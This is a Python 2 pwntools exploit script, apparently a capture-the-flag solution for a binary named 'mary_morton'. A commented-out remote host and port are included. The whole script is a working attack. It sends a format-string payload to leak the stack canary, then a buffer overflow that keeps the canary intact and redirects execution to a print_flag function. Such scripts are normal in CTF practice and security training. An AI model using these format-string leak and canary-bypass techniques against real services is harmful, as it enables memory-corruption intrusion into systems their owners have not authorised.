#!/usr/bin/env python2
from pwn import *

HOST = "146.185.132.36"
PORT = 19153

file_path = "./mary_morton"
# libc_path = "./libc.so.6"
proc_args = []

gdb_bps = []
gdb_bps += [0x4009a5]
gdb_cmd = []
gdb_cmd += ["break *" + hex(x) for x in gdb_bps]
gdb_cmd += ['c']
gdb_cmd = '\n'.join(gdb_cmd)
# gdb_env = {'LD_PRELOAD': './libc.so.6'}

context.binary = file_path
# context.log_level = 'debug'
context.terminal = ['konsole', '-e']

proc = process(file_path)
#proc = remote(HOST, PORT)
#proc = gdb.debug(file_path, gdb_cmd)
#elf = ELF(file_path)
#libc = ELF(libc_path)

print_flag = 0x4008DA

payload = ""
payload += "A" * 8
payload += "B" * 8
payload += "C" * 8
payload += "%6$p "
payload += "%7$p "
payload += "%23$p "

payload = payload.ljust(124, "A")
payload += "END"
proc.sendlineafter("battle \n", "2")
proc.sendline(payload)
res = proc.recvuntil("END")
stack_cookie = int(res.split(" ")[2], 16)
log.info("STACK COOKIE: " + hex(stack_cookie))
proc.sendlineafter("battle \n", "1")
bo = ""
bo += "A" * 136
bo += p64(stack_cookie)
bo += p64(0x4141414141414141)
bo += p64(print_flag)
proc.sendline(bo)
proc.recv(1024)
print proc.recv(1024)
# proc.interactive()
